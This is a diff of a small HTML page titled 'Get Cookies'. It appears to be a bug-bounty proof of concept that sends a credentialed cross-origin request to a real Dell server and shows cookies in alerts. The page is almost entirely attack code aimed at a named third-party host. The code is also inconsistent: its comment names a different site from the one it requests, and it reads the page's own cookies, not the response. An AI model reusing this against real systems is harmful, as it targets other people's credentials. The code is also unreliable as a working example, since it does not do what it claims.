@@ -1,35 +1,38 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Get Cookies</title>
+</head>
+<body>
 <script>
-// Function to get the value of a specific cookie by name
-function getCookie(name) {
-    let cookieArr = document.cookie.split(";");
+// Function to get all cookies as an object
+function getAllCookies() {
+    let cookies = {};
+    let cookieArr = document.cookie.split(';');
     for (let i = 0; i < cookieArr.length; i++) {
-        let cookiePair = cookieArr[i].split("=");
-        if (name === cookiePair[0].trim()) {
-            return decodeURIComponent(cookiePair[1]);
-        }
+        let cookiePair = cookieArr[i].split('=');
+        cookies[cookiePair[0].trim()] = decodeURIComponent(cookiePair[1]);
     }
-    return null;
-}
-
-// Example usage: Reading a cookie named 'exampleCookie'
-var exampleCookie = getCookie('ak_bmsc');
-if (exampleCookie) {
-    alert('ak_bmsc: ' + exampleCookie);
-} else {
-    alert('ak_bmsc not found');
+    return cookies;
 }
 
 // Fetch cookies from bugbountytraining.com
 var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
-        var allCookies = document.cookie; // Retrieve all cookies
-        alert('All Cookies: ' + allCookies);
+        // Log all cookies to the console
+        console.log('Cookies:', document.cookie);
+        // Get cookies as an object
+        var cookies = getAllCookies();
+        // Display each cookie in an alert
+        for (let name in cookies) {
+            alert(name + ': ' + cookies[name]);
+        }
     }
 };
 xhttp.open("GET", "https://gbxgateway.dell.com", true);
 xhttp.withCredentials = true;
 xhttp.send();
 </script>
+</body>
 </html>
